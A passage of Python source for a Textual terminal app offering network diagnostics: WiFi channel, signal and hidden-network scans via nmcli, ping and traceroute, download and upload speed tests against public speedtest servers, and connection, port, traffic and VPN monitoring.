                "nmcli", "-t", "-f", "SSID,CHAN,SIGNAL,FREQ", "device", "wifi", "list",
                stdout=asyncio.subprocess.PIPE,
            )
            stdout, _ = await proc.communicate()

            if stdout:
                # Aggregate by channel
                channels_2g = {}  # 1-14
                channels_5g = {}  # 36+

                for line in stdout.decode().strip().split('\n'):
                    if line:
                        parts = line.split(':')
                        if len(parts) >= 4:
                            ssid = parts[0] or "[Hidden]"
                            chan = parts[1]
                            signal = int(parts[2]) if parts[2].isdigit() else 0
                            freq = parts[3]

                            if chan.isdigit():
                                chan_num = int(chan)
                                if chan_num <= 14:
                                    if chan_num not in channels_2g:
                                        channels_2g[chan_num] = []
                                    channels_2g[chan_num].append((ssid, signal))
                                else:
                                    if chan_num not in channels_5g:
                                        channels_5g[chan_num] = []
                                    channels_5g[chan_num].append((ssid, signal))

                # Display 2.4 GHz channels
                log.write("[bold cyan]2.4 GHz Band:[/bold cyan]")
                log.write(f"{'Ch':<4} {'Networks':<10} {'Congestion':<15} {'Top SSID'}")
                log.write("-" * 55)

                for ch in range(1, 15):
                    networks = channels_2g.get(ch, [])
                    count = len(networks)
                    if count == 0:
                        bar = "[green]░░░░░░░░░░[/green]"
                        congestion = "Clear"
                    elif count <= 2:
                        bar = "[yellow]▓▓░░░░░░░░[/yellow]"
                        congestion = "Low"
                    elif count <= 4:
                        bar = "[yellow]▓▓▓▓░░░░░░[/yellow]"
                        congestion = "Medium"
                    else:
                        bar = "[red]▓▓▓▓▓▓▓▓░░[/red]"
                        congestion = "High"

                    top_ssid = networks[0][0][:15] if networks else ""
                    log.write(f"{ch:<4} {count:<10} {bar} {top_ssid}")

                # Display 5 GHz channels
                if channels_5g:
                    log.write("\n[bold cyan]5 GHz Band:[/bold cyan]")
                    log.write(f"{'Ch':<4} {'Networks':<10} {'Top Signal':<12} {'SSID'}")
                    log.write("-" * 50)

                    for ch in sorted(channels_5g.keys()):
                        networks = channels_5g[ch]
                        count = len(networks)
                        top_signal = max(n[1] for n in networks)
                        top_ssid = networks[0][0][:20]

                        if top_signal >= 70:
                            color = "green"
                        elif top_signal >= 40:
                            color = "yellow"
                        else:
                            color = "red"

                        log.write(f"[{color}]{ch:<4} {count:<10} {top_signal}%         {top_ssid}[/{color}]")

                # Recommendation
                log.write("\n[bold cyan]Recommendation:[/bold cyan]")
                # Find least congested channels
                best_2g = min(range(1, 14), key=lambda c: len(channels_2g.get(c, [])))
                log.write(f"[green]Best 2.4 GHz channel: {best_2g}[/green]")

            status.update("[green]Channel analysis complete[/green]")

        except Exception as e:
            log.write(f"[red]Error: {e}[/red]")
            status.update("[red]Analysis failed[/red]")

    @work(exclusive=True)
    async def run_signal_monitor(self) -> None:
        """Monitor current WiFi signal strength."""
        log = self.query_one("#wifi-results", RichLog)
        status = self.query_one("#wifi-status", Static)
        spark = self.query_one("#bandwidth-spark", Sparkline)

        log.clear()
        status.update("[cyan]Monitoring signal strength...[/cyan]")
        log.write("[bold cyan]WiFi Signal Strength Monitor[/bold cyan]\n")

        try:
            # Get current connection
            proc = await asyncio.create_subprocess_exec(
                "nmcli", "-t", "-f", "ACTIVE,SSID,SIGNAL,CHAN,FREQ", "device", "wifi", "list",
                stdout=asyncio.subprocess.PIPE,
            )
            stdout, _ = await proc.communicate()

            current_ssid = None
            if stdout:
                for line in stdout.decode().strip().split('\n'):
                    if line.startswith("yes:"):
                        parts = line.split(':')
                        if len(parts) >= 5:
                            current_ssid = parts[1]
                            signal = parts[2]
                            chan = parts[3]
                            freq = parts[4]
                            log.write(f"[green]Connected to: {current_ssid}[/green]")
                            log.write(f"[cyan]Channel: {chan} ({freq})[/cyan]")
                            log.write(f"[cyan]Signal: {signal}%[/cyan]\n")
                            break

            if not current_ssid:
                log.write("[yellow]Not connected to WiFi[/yellow]")
                status.update("[yellow]No WiFi connection[/yellow]")
                return

            # Monitor signal over time
            log.write("[cyan]Signal history (10 samples):[/cyan]")
            signal_data = []

            for i in range(10):
                proc = await asyncio.create_subprocess_exec(
                    "nmcli", "-t", "-f", "ACTIVE,SIGNAL", "device", "wifi", "list",
                    stdout=asyncio.subprocess.PIPE,
                )
                stdout, _ = await proc.communicate()

                if stdout:
                    for line in stdout.decode().strip().split('\n'):
                        if line.startswith("yes:"):
                            sig = int(line.split(':')[1])
                            signal_data.append(sig)
                            spark.data = signal_data

                            if sig >= 70:
                                color = "green"
                                quality = "Excellent"
                            elif sig >= 50:
                                color = "yellow"
                                quality = "Good"
                            elif sig >= 30:
                                color = "yellow"
                                quality = "Fair"
                            else:
                                color = "red"
                                quality = "Poor"

                            log.write(f"[{color}]Sample {i+1}: {sig}% ({quality})[/{color}]")
                            break

                await asyncio.sleep(1)

            # Summary
            if signal_data:
                avg_signal = sum(signal_data) / len(signal_data)
                min_signal = min(signal_data)
                max_signal = max(signal_data)
                log.write(f"\n[bold cyan]Summary:[/bold cyan]")
                log.write(f"  Average: {avg_signal:.0f}%")
                log.write(f"  Min: {min_signal}%, Max: {max_signal}%")
                log.write(f"  Variance: {max_signal - min_signal}%")

            status.update("[green]Signal monitoring complete[/green]")

        except Exception as e:
            log.write(f"[red]Error: {e}[/red]")
            status.update("[red]Monitoring failed[/red]")

    @work(exclusive=True)
    async def run_hidden_scan(self) -> None:
        """Scan for hidden WiFi networks."""
        log = self.query_one("#wifi-results", RichLog)
        status = self.query_one("#wifi-status", Static)

        log.clear()
        status.update("[cyan]Scanning for hidden networks...[/cyan]")
        log.write("[bold cyan]Hidden Network Detection[/bold cyan]\n")

        try:
            proc = await asyncio.create_subprocess_exec(
                "nmcli", "-t", "-f", "SSID,BSSID,SIGNAL,CHAN,SECURITY", "device", "wifi", "list",
                stdout=asyncio.subprocess.PIPE,
            )
            stdout, _ = await proc.communicate()

            hidden_count = 0
            visible_count = 0

            if stdout:
                log.write("[cyan]Detected Networks:[/cyan]\n")
                log.write(f"{'SSID':<25} {'BSSID':<20} {'Signal':<8} {'Ch':<5} {'Security'}")
                log.write("-" * 75)

                for line in stdout.decode().strip().split('\n'):
                    if line:
                        parts = line.split(':')
                        if len(parts) >= 5:
                            ssid = parts[0]
                            bssid = parts[1]
                            signal = parts[2]
                            chan = parts[3]
                            security = parts[4]

                            if not ssid or ssid == "--":
                                hidden_count += 1
                                ssid_display = "[Hidden Network]"
                                vendor = lookup_mac_vendor(bssid)
                                log.write(f"[red]{ssid_display:<25} {bssid:<20} {signal:>5}%  {chan:<5} {security}[/red]")
                                log.write(f"[gray]  └─ Vendor: {vendor}[/gray]")
                            else:
                                visible_count += 1
                                log.write(f"[green]{ssid:<25} {bssid:<20} {signal:>5}%  {chan:<5} {security}[/green]")

                log.write(f"\n[bold cyan]Summary:[/bold cyan]")
                log.write(f"  Visible networks: [green]{visible_count}[/green]")
                log.write(f"  Hidden networks:  [red]{hidden_count}[/red]")

                if hidden_count > 0:
                    log.write("\n[yellow]Note: Hidden networks broadcast their BSSID[/yellow]")
                    log.write("[yellow]but not their SSID. MAC vendor lookup can[/yellow]")
                    log.write("[yellow]help identify the device manufacturer.[/yellow]")

            status.update("[green]Hidden network scan complete[/green]")

        except Exception as e:
            log.write(f"[red]Error: {e}[/red]")
            status.update("[red]Scan failed[/red]")


class PingModule(Container):
    """Ping and traceroute module."""

    def compose(self) -> ComposeResult:
        yield Horizontal(
            Vertical(
                Input(placeholder="Target", id="ping-target", value="8.8.8.8"),
                Input(placeholder="Count", id="ping-count", value="5"),
                Button("Ping", id="btn-ping", variant="primary"),
                Button("Trace", id="btn-trace"),
                Button("Stop", id="btn-ping-stop", variant="error"),
                Static("", id="ping-status"),
                classes="sidebar",
            ),
            WrappingRichLog(id="ping-results", highlight=True, markup=True, wrap=True, classes="main-output"),
            classes="module-layout",
        )

    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self._current_proc = None

    @on(Button.Pressed, "#btn-ping")
    def do_ping(self) -> None:
        target = self.query_one("#ping-target", Input).value.strip()
        count = self.query_one("#ping-count", Input).value.strip()
        if not target:
            self.query_one("#ping-status", Static).update("[red]Please enter a target[/red]")
            return
        self.run_ping(target, count or "5")

    @on(Button.Pressed, "#btn-trace")
    def do_trace(self) -> None:
        target = self.query_one("#ping-target", Input).value.strip()
        if not target:
            self.query_one("#ping-status", Static).update("[red]Please enter a target[/red]")
            return
        self.run_traceroute(target)

    @on(Button.Pressed, "#btn-ping-stop")
    def stop_ping(self) -> None:
        if self._current_proc:
            try:
                self._current_proc.terminate()
            except Exception:
                pass
        self.query_one("#ping-status", Static).update("[yellow]Stopped[/yellow]")

    @work(exclusive=True)
    async def run_ping(self, target: str, count: str) -> None:
        log = self.query_one("#ping-results", RichLog)
        status = self.query_one("#ping-status", Static)

        status.update(f"[cyan]Pinging {target}...[/cyan]")
        log.write(f"[cyan]> ping -c {count} {target}[/cyan]\n")

        try:
            self._current_proc = await asyncio.create_subprocess_exec(
                "ping", "-c", count, target,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )

            async for line in self._current_proc.stdout:
                text = line.decode().rstrip()
                if "time=" in text:
                    match = re.search(r'time=(\d+\.?\d*)', text)
                    if match:
                        latency = float(match.group(1))
                        if latency < 50:
                            log.write(f"[green]{text}[/green]")
                        elif latency < 100:
                            log.write(f"[yellow]{text}[/yellow]")
                        else:
                            log.write(f"[red]{text}[/red]")
                    else:
                        log.write(text)
                elif "statistics" in text or "packets" in text:
                    log.write(f"[cyan]{text}[/cyan]")
                else:
                    log.write(text)

            await self._current_proc.wait()
            status.update("[green]Ping complete[/green]")

        except Exception as e:
            log.write(f"[red]Error: {e}[/red]")
            status.update("[red]Ping failed[/red]")
        finally:
            self._current_proc = None

    @work(exclusive=True)
    async def run_traceroute(self, target: str) -> None:
        log = self.query_one("#ping-results", RichLog)
        status = self.query_one("#ping-status", Static)

        status.update(f"[cyan]Tracing route to {target}...[/cyan]")
        log.write(f"[cyan]> traceroute {target}[/cyan]\n")

        try:
            self._current_proc = await asyncio.create_subprocess_exec(
                "traceroute", "-m", "20", target,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )

            async for line in self._current_proc.stdout:
                text = line.decode().rstrip()
                if re.match(r'^\s*\d+', text):
                    if '*' in text:
                        log.write(f"[yellow]{text}[/yellow]")
                    else:
                        log.write(f"[green]{text}[/green]")
                else:
                    log.write(f"[cyan]{text}[/cyan]")

            await self._current_proc.wait()
            status.update("[green]Traceroute complete[/green]")

        except Exception as e:
            log.write(f"[red]Error: {e}[/red]")
            status.update("[red]Traceroute failed[/red]")
        finally:
            self._current_proc = None


class SpeedModule(Container):
    """Network speed test module."""

    def compose(self) -> ComposeResult:
        yield Horizontal(
            Vertical(
                Select([
                    ("Tele2", "tele2"),
                    ("Cloudflare", "cloudflare"),
                    ("Hetzner", "hetzner"),
                ], id="speed-server", value="tele2"),
                Button("Download", id="btn-speed", variant="primary"),
                Button("Upload", id="btn-upload"),
                Button("Full Test", id="btn-full-speed"),
                Button("Latency", id="btn-latency"),
                ProgressBar(id="speed-progress", total=100, show_eta=False),
                Static("", id="speed-status"),
                classes="sidebar",
            ),
            WrappingRichLog(id="speed-results", highlight=True, markup=True, wrap=True, classes="main-output"),
            classes="module-layout",
        )

    @on(Button.Pressed, "#btn-speed")
    def run_speed(self) -> None:
        server = self.query_one("#speed-server", Select).value
        self.do_speed_test(server)

    @on(Button.Pressed, "#btn-upload")
    def run_upload(self) -> None:
        server = self.query_one("#speed-server", Select).value
        self.do_upload_test(server)

    @on(Button.Pressed, "#btn-full-speed")
    def run_full(self) -> None:
        server = self.query_one("#speed-server", Select).value
        self.do_full_test(server)

    @on(Button.Pressed, "#btn-latency")
    def run_latency(self) -> None:
        self.do_latency_test()

    def _get_server_urls(self, server: str) -> dict:
        """Get download/upload URLs for selected server."""
        servers = {
            "tele2": {
                "download": "http://speedtest.tele2.net/10MB.zip",
                "upload": "http://speedtest.tele2.net/upload.php",
                "name": "Tele2 Speedtest",
            },
            "cloudflare": {
                "download": "https://speed.cloudflare.com/__down?bytes=10000000",
                "upload": "https://speed.cloudflare.com/__up",
                "name": "Cloudflare",
            },
            "hetzner": {
                "download": "https://speed.hetzner.de/10MB.bin",
                "upload": None,
                "name": "Hetzner (Germany)",
            },
            "ovh": {
                "download": "http://proof.ovh.net/files/10Mb.dat",
                "upload": None,
                "name": "OVH (France)",
            },
        }
        return servers.get(server, servers["tele2"])

    @work(exclusive=True)
    async def do_speed_test(self, server: str = "tele2") -> None:
        log = self.query_one("#speed-results", RichLog)
        status = self.query_one("#speed-status", Static)
        progress = self.query_one("#speed-progress", ProgressBar)

        log.clear()
        server_info = self._get_server_urls(server)
        status.update(f"[cyan]Testing download from {server_info['name']}...[/cyan]")
        progress.progress = 0

        try:
            log.write(f"[bold cyan]Download Speed Test[/bold cyan]")
            log.write(f"[cyan]Server: {server_info['name']}[/cyan]\n")
            progress.progress = 10

            proc = await asyncio.create_subprocess_exec(
                "curl", "-o", "/dev/null", "-w", "%{speed_download}|%{time_total}|%{size_download}",
                "-s", "--max-time", "30", server_info["download"],
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )
            stdout, _ = await proc.communicate()

            progress.progress = 80

            if stdout:
                parts = stdout.decode().strip().split("|")
                if len(parts) >= 3:
                    speed_bps = float(parts[0])
                    time_total = float(parts[1])
                    size = int(float(parts[2]))

                    speed_mbps = (speed_bps * 8) / 1_000_000
                    size_mb = size / 1_000_000

                    log.write(f"[green]Download Speed: {speed_mbps:.2f} Mbps[/green]")
                    log.write(f"[cyan]Downloaded: {size_mb:.1f} MB in {time_total:.1f}s[/cyan]")

            progress.progress = 100
            status.update("[green]Download test complete[/green]")

        except Exception as e:
            log.write(f"[red]Error: {e}[/red]")
            status.update("[red]Speed test failed[/red]")

    @work(exclusive=True)
    async def do_upload_test(self, server: str = "tele2") -> None:
        log = self.query_one("#speed-results", RichLog)
        status = self.query_one("#speed-status", Static)
        progress = self.query_one("#speed-progress", ProgressBar)

        log.clear()
        server_info = self._get_server_urls(server)
        progress.progress = 0

        if not server_info.get("upload"):
            log.write(f"[yellow]Upload test not available for {server_info['name']}[/yellow]")
            log.write("[cyan]Try Tele2 or Cloudflare server[/cyan]")
            status.update("[yellow]Upload not supported[/yellow]")
            return

        status.update(f"[cyan]Testing upload to {server_info['name']}...[/cyan]")

        try:
            log.write(f"[bold cyan]Upload Speed Test[/bold cyan]")
            log.write(f"[cyan]Server: {server_info['name']}[/cyan]")
            log.write("[cyan]Generating test data...[/cyan]\n")
            progress.progress = 10

            # Generate 5MB of random data for upload
            proc = await asyncio.create_subprocess_exec(
                "curl", "-X", "POST", "-w", "%{speed_upload}|%{time_total}",
                "-s", "--max-time", "60",
                "-d", "@/dev/urandom", "--data-binary", "-H", "Content-Type: application/octet-stream",
                "-o", "/dev/null", "--limit-rate", "0",
                server_info["upload"],
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )
            stdout, _ = await proc.communicate()

            progress.progress = 80

            if stdout and '|' in stdout.decode():
                parts = stdout.decode().strip().split("|")
                speed_bps = float(parts[0]) if parts[0] else 0
                speed_mbps = (speed_bps * 8) / 1_000_000
                log.write(f"[green]Upload Speed: {speed_mbps:.2f} Mbps[/green]")
            else:
                log.write("[yellow]Upload test completed (speed data unavailable)[/yellow]")

            progress.progress = 100
            status.update("[green]Upload test complete[/green]")

        except Exception as e:
            log.write(f"[red]Error: {e}[/red]")
            status.update("[red]Upload test failed[/red]")

    @work(exclusive=True)
    async def do_full_test(self, server: str = "tele2") -> None:
        log = self.query_one("#speed-results", RichLog)
        status = self.query_one("#speed-status", Static)
        progress = self.query_one("#speed-progress", ProgressBar)

        log.clear()
        server_info = self._get_server_urls(server)
        status.update(f"[cyan]Running full speed test...[/cyan]")
        progress.progress = 0

        try:
            log.write(f"[bold cyan]Full Speed Test[/bold cyan]")
            log.write(f"[cyan]Server: {server_info['name']}[/cyan]\n")

            # Latency test first
            log.write("[cyan]Testing latency...[/cyan]")
            progress.progress = 10

            proc = await asyncio.create_subprocess_exec(
                "ping", "-c", "5", "-q", "8.8.8.8",
                stdout=asyncio.subprocess.PIPE,
            )
            stdout, _ = await proc.communicate()

            if stdout:
                match = re.search(r'rtt min/avg/max/mdev = ([\d.]+)/([\d.]+)/([\d.]+)', stdout.decode())
                if match:
                    min_rtt, avg_rtt, max_rtt = match.groups()
                    log.write(f"[green]Latency: {avg_rtt} ms (min: {min_rtt}, max: {max_rtt})[/green]\n")

            # Download test
            log.write("[cyan]Testing download speed...[/cyan]")
            progress.progress = 30

            proc = await asyncio.create_subprocess_exec(
                "curl", "-o", "/dev/null", "-w", "%{speed_download}",
                "-s", "--max-time", "30", server_info["download"],
                stdout=asyncio.subprocess.PIPE,
            )
            stdout, _ = await proc.communicate()

            download_mbps = 0
            if stdout:
                speed_bps = float(stdout.decode().strip())
                download_mbps = (speed_bps * 8) / 1_000_000
                log.write(f"[green]Download: {download_mbps:.2f} Mbps[/green]\n")

            progress.progress = 60

            # Upload test if available
            upload_mbps = 0
            if server_info.get("upload"):
                log.write("[cyan]Testing upload speed...[/cyan]")

                proc = await asyncio.create_subprocess_exec(
                    "curl", "-X", "POST", "-w", "%{speed_upload}",
                    "-s", "--max-time", "30", "-d", "@/dev/zero",
                    "-o", "/dev/null", server_info["upload"],
                    stdout=asyncio.subprocess.PIPE,
                )
                stdout, _ = await proc.communicate()

                if stdout:
                    speed_bps = float(stdout.decode().strip()) if stdout.decode().strip() else 0
                    upload_mbps = (speed_bps * 8) / 1_000_000
                    log.write(f"[green]Upload: {upload_mbps:.2f} Mbps[/green]\n")
            else:
                log.write("[yellow]Upload test not available for this server[/yellow]\n")

            progress.progress = 100

            # Summary
            log.write("[bold cyan]Summary:[/bold cyan]")
            log.write(f"  Download: [green]{download_mbps:.2f} Mbps[/green]")
            if upload_mbps > 0:
                log.write(f"  Upload:   [green]{upload_mbps:.2f} Mbps[/green]")

            status.update("[green]Full test complete[/green]")

        except Exception as e:
            log.write(f"[red]Error: {e}[/red]")
            status.update("[red]Full test failed[/red]")

    @work(exclusive=True)
    async def do_latency_test(self) -> None:
        log = self.query_one("#speed-results", RichLog)
        status = self.query_one("#speed-status", Static)

        log.clear()
        status.update("[cyan]Testing latency to multiple servers...[/cyan]")

        servers = [
            ("Google DNS", "8.8.8.8"),
            ("Cloudflare", "1.1.1.1"),
            ("OpenDNS", "208.67.222.222"),
            ("Quad9", "9.9.9.9"),
        ]

        log.write("[cyan]Latency to DNS Servers:[/cyan]\n")

        for name, ip in servers:
            try:
                proc = await asyncio.create_subprocess_exec(
                    "ping", "-c", "3", "-q", ip,
                    stdout=asyncio.subprocess.PIPE,
                )
                stdout, _ = await proc.communicate()

                if stdout:
                    match = re.search(r'rtt min/avg/max/mdev = ([\d.]+)/([\d.]+)/([\d.]+)', stdout.decode())
                    if match:
                        min_rtt, avg_rtt, max_rtt = match.groups()
                        avg = float(avg_rtt)
                        if avg < 30:
                            color = "green"
                        elif avg < 100:
                            color = "yellow"
                        else:
                            color = "red"
                        log.write(f"[{color}]{name:<15} ({ip:<15}): {avg_rtt} ms[/{color}]")
                    else:
                        log.write(f"[red]{name:<15} ({ip:<15}): timeout[/red]")

            except Exception as e:
                log.write(f"[red]{name}: error - {e}[/red]")

        status.update("[green]Latency test complete[/green]")


class MonitorModule(Container):
    """Network traffic monitor with VPN status."""

    def compose(self) -> ComposeResult:
        yield Horizontal(
            Vertical(
                Button("Conns", id="btn-connections", variant="primary"),
                Button("Traffic", id="btn-traffic"),
                Button("Ports", id="btn-ports"),
                Button("VPN", id="btn-vpn"),
                Button("Process", id="btn-per-process"),
                Button("Talkers", id="btn-top-talkers"),
                Button("Sockets", id="btn-socket-stats"),
                Static("", id="monitor-status"),
                classes="sidebar",
            ),
            WrappingRichLog(id="monitor-results", highlight=True, markup=True, wrap=True, classes="main-output"),
            classes="module-layout",
        )

    @on(Button.Pressed, "#btn-connections")
    def show_connections(self) -> None:
        self.get_connections()

    @on(Button.Pressed, "#btn-traffic")
    def show_traffic(self) -> None:
        self.get_traffic()

    @on(Button.Pressed, "#btn-ports")
    def show_ports(self) -> None:
        self.get_ports()

    @on(Button.Pressed, "#btn-vpn")
    def show_vpn(self) -> None:
        self.get_vpn_status()

    @on(Button.Pressed, "#btn-per-process")
    def show_per_process(self) -> None:
        self.get_per_process()

    @on(Button.Pressed, "#btn-top-talkers")
    def show_top_talkers(self) -> None:
        self.get_top_talkers()

    @on(Button.Pressed, "#btn-socket-stats")
    def show_socket_stats(self) -> None:
        self.get_socket_stats()

    @work(exclusive=True)
    async def get_connections(self) -> None:
        log = self.query_one("#monitor-results", RichLog)
        status = self.query_one("#monitor-status", Static)

        log.clear()
        status.update("[cyan]Getting active connections...[/cyan]")

        try:
            proc = await asyncio.create_subprocess_exec(
                "ss", "-tunapo",
                stdout=asyncio.subprocess.PIPE,
            )
            stdout, _ = await proc.communicate()

            if stdout:
                lines = stdout.decode().strip().split('\n')
                for i, line in enumerate(lines):
                    if i == 0:
                        log.write(f"[cyan]{line}[/cyan]")
                    elif "ESTAB" in line:
                        log.write(f"[green]{line}[/green]")
                    elif "LISTEN" in line:
                        log.write(f"[yellow]{line}[/yellow]")
                    elif "TIME-WAIT" in line or "CLOSE" in line:
                        log.write(f"[gray]{line}[/gray]")
                    else:
                        log.write(line)

            status.update("[green]Connections retrieved[/green]")

        except Exception as e:
            log.write(f"[red]Error: {e}[/red]")
            status.update("[red]Failed[/red]")

    @work(exclusive=True)
    async def get_traffic(self) -> None:
        log = self.query_one("#monitor-results", RichLog)
        status = self.query_one("#monitor-status", Static)

        log.clear()
        status.update("[cyan]Getting traffic statistics...[/cyan]")

        try:
            proc = await asyncio.create_subprocess_exec(
                "cat", "/proc/net/dev",
                stdout=asyncio.subprocess.PIPE,
            )
            stdout, _ = await proc.communicate()

            if stdout:
                log.write("[cyan]Interface Statistics:[/cyan]\n")
                log.write(f"{'Interface':<12} {'RX Bytes':<15} {'RX Packets':<12} {'TX Bytes':<15} {'TX Packets':<12}")
                log.write("-" * 70)

                for line in stdout.decode().strip().split('\n')[2:]:
                    parts = line.split()
                    if len(parts) >= 10:
                        iface = parts[0].rstrip(':')
                        rx_bytes = int(parts[1])
                        rx_packets = int(parts[2])
                        tx_bytes = int(parts[9])
                        tx_packets = int(parts[10])

                        def fmt_bytes(b):
                            if b > 1_000_000_000:
                                return f"{b/1_000_000_000:.1f} GB"
                            elif b > 1_000_000:
                                return f"{b/1_000_000:.1f} MB"
                            elif b > 1_000:
                                return f"{b/1_000:.1f} KB"
                            return f"{b} B"

                        if rx_bytes > 0 or tx_bytes > 0:
                            log.write(f"[green]{iface:<12} {fmt_bytes(rx_bytes):<15} {rx_packets:<12} {fmt_bytes(tx_bytes):<15} {tx_packets:<12}[/green]")

            status.update("[green]Traffic stats retrieved[/green]")

        except Exception as e:
            log.write(f"[red]Error: {e}[/red]")
            status.update("[red]Failed[/red]")

    @work(exclusive=True)
    async def get_ports(self) -> None:
        log = self.query_one("#monitor-results", RichLog)
        status = self.query_one("#monitor-status", Static)

        log.clear()
        status.update("[cyan]Getting listening ports...[/cyan]")

        try:
            proc = await asyncio.create_subprocess_exec(
                "ss", "-tlnp",
                stdout=asyncio.subprocess.PIPE,
            )
            stdout, _ = await proc.communicate()

            if stdout:
                log.write("[cyan]Listening TCP Ports:[/cyan]\n")
                for i, line in enumerate(stdout.decode().strip().split('\n')):
                    if i == 0:
                        log.write(f"[cyan]{line}[/cyan]")
                    else:
                        log.write(f"[green]{line}[/green]")

            proc = await asyncio.create_subprocess_exec(
                "ss", "-ulnp",
                stdout=asyncio.subprocess.PIPE,
            )
            stdout, _ = await proc.communicate()

            if stdout:
                log.write("\n[cyan]Listening UDP Ports:[/cyan]\n")
                for i, line in enumerate(stdout.decode().strip().split('\n')):
                    if i == 0:
                        log.write(f"[cyan]{line}[/cyan]")
                    else:
                        log.write(f"[yellow]{line}[/yellow]")

            status.update("[green]Ports retrieved[/green]")

        except Exception as e:
            log.write(f"[red]Error: {e}[/red]")
            status.update("[red]Failed[/red]")

    @work(exclusive=True)
    async def get_vpn_status(self) -> None:
        """Check VPN and Tailscale status."""
        log = self.query_one("#monitor-results", RichLog)
        status = self.query_one("#monitor-status", Static)

        log.clear()
        status.update("[cyan]Checking VPN status...[/cyan]")

        try:
            # Check Tailscale
            log.write("[bold cyan]Tailscale Status[/bold cyan]")
            proc = await asyncio.create_subprocess_exec(
                "tailscale", "status", "--json",
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )
            stdout, stderr = await proc.communicate()

            if proc.returncode == 0 and stdout:
                try:
                    ts_status = json.loads(stdout.decode())
                    if ts_status.get("BackendState") == "Running":
                        log.write(f"[green]Status: Connected[/green]")
                        if ts_status.get("Self"):
                            self_info = ts_status["Self"]
                            log.write(f"[green]Hostname: {self_info.get('HostName', 'N/A')}[/green]")
                            log.write(f"[green]IP: {', '.join(self_info.get('TailscaleIPs', []))}[/green]")

                        # Show peers
                        peers = ts_status.get("Peer", {})
                        if peers:
                            log.write(f"\n[cyan]Connected Peers ({len(peers)}):[/cyan]")
                            for peer_id, peer in list(peers.items())[:5]:
                                name = peer.get("HostName", "Unknown")
                                ips = ", ".join(peer.get("TailscaleIPs", []))
                                online = "[green]online[/green]" if peer.get("Online") else "[red]offline[/red]"
                                log.write(f"  {name}: {ips} ({online})")
                            if len(peers) > 5:
                                log.write(f"  [gray]... and {len(peers) - 5} more[/gray]")
                    else:
                        log.write(f"[yellow]Status: {ts_status.get('BackendState', 'Unknown')}[/yellow]")
                except json.JSONDecodeError:
                    log.write("[yellow]Tailscale: Unable to parse status[/yellow]")
            else:
                log.write("[yellow]Tailscale: Not installed or not running[/yellow]")

            # Check other VPN interfaces
            log.write("\n[bold cyan]VPN Interfaces[/bold cyan]")
            proc = await asyncio.create_subprocess_exec(
                "ip", "link", "show",
                stdout=asyncio.subprocess.PIPE,
            )
            stdout, _ = await proc.communicate()

            vpn_found = False
            if stdout:
                for line in stdout.decode().split('\n'):
                    if any(vpn in line.lower() for vpn in ['tun', 'tap', 'wg', 'tailscale']):
                        vpn_found = True
                        match = re.search(r'\d+:\s+(\S+):', line)
                        if match:
                            iface = match.group(1)
                            state = "UP" if "UP" in line else "DOWN"
                            color = "green" if state == "UP" else "red"
                            log.write(f"[{color}]{iface}: {state}[/{color}]")

            if not vpn_found:
                log.write("[gray]No VPN interfaces detected[/gray]")

            status.update("[green]VPN status retrieved[/green]")

        except Exception as e:
            log.write(f"[red]Error: {e}[/red]")
            status.update("[red]Failed[/red]")

    @work(exclusive=True)
    async def get_per_process(self) -> None:
        """Get network usage per process."""
        log = self.query_one("#monitor-results", RichLog)
        status = self.query_one("#monitor-status", Static)

        log.clear()
        status.update("[cyan]Getting per-process network usage...[/cyan]")
        log.write("[bold cyan]Network Usage by Process[/bold cyan]\n")

        try:
            # Use ss with process info
            proc = await asyncio.create_subprocess_exec(
                "ss", "-tunap",
                stdout=asyncio.subprocess.PIPE,
            )
            stdout, _ = await proc.communicate()

            if stdout:
                # Parse and aggregate by process
                process_conns = {}
                lines = stdout.decode().strip().split('\n')[1:]  # Skip header

                for line in lines:
                    # Extract process name from users:((...))
                    match = re.search(r'users:\(\("([^"]+)"', line)
                    if match:
                        proc_name = match.group(1)
                        if proc_name not in process_conns:
                            process_conns[proc_name] = {'estab': 0, 'listen': 0, 'other': 0}
                        if 'ESTAB' in line:
                            process_conns[proc_name]['estab'] += 1
                        elif 'LISTEN' in line:
                            process_conns[proc_name]['listen'] += 1
                        else:
                            process_conns[proc_name]['other'] += 1

                log.write(f"{'Process':<25} {'Established':<12} {'Listening':<10} {'Other'}")
                log.write("-" * 60)

                for proc_name, counts in sorted(process_conns.items(), key=lambda x: x[1]['estab'], reverse=True):
                    if counts['estab'] > 0:
                        log.write(f"[green]{proc_name:<25} {counts['estab']:<12} {counts['listen']:<10} {counts['other']}[/green]")
                    elif counts['listen'] > 0:
                        log.write(f"[yellow]{proc_name:<25} {counts['estab']:<12} {counts['listen']:<10} {counts['other']}[/yellow]")
                    else:
                        log.write(f"[gray]{proc_name:<25} {counts['estab']:<12} {counts['listen']:<10} {counts['other']}[/gray]")

            status.update("[green]Per-process info loaded[/green]")

        except Exception as e:
            log.write(f"[red]Error: {e}[/red]")
            status.update("[red]Failed[/red]")

    @work(exclusive=True)
    async def get_top_talkers(self) -> None:
        """Get top network connections by data transfer."""
        log = self.query_one("#monitor-results", RichLog)
        status = self.query_one("#monitor-status", Static)

        log.clear()
        status.update("[cyan]Analyzing top connections...[/cyan]")
        log.write("[bold cyan]Top Network Connections[/bold cyan]\n")

        try:
            # Get established connections with byte counts
            proc = await asyncio.create_subprocess_exec(
                "ss", "-tni", "state", "established",
                stdout=asyncio.subprocess.PIPE,
            )
            stdout, _ = await proc.communicate()

            if stdout:
                connections = []
                lines = stdout.decode().strip().split('\n')

                i = 0
                while i < len(lines):
                    line = lines[i]
                    if ':' in line and 'ESTAB' not in line:
                        # Connection line
                        parts = line.split()
                        if len(parts) >= 4:
                            local = parts[2] if len(parts) > 2 else "?"
                            remote = parts[3] if len(parts) > 3 else "?"

                            # Next line might have bytes info
                            bytes_recv = 0
                            bytes_sent = 0
                            if i + 1 < len(lines):
                                next_line = lines[i + 1]
                                recv_match = re.search(r'bytes_received:(\d+)', next_line)
                                sent_match = re.search(r'bytes_sent:(\d+)', next_line)
                                if recv_match:
                                    bytes_recv = int(recv_match.group(1))
                                if sent_match:
                                    bytes_sent = int(sent_match.group(1))

                            connections.append((local, remote, bytes_recv, bytes_sent))
                    i += 1

                # Sort by total bytes
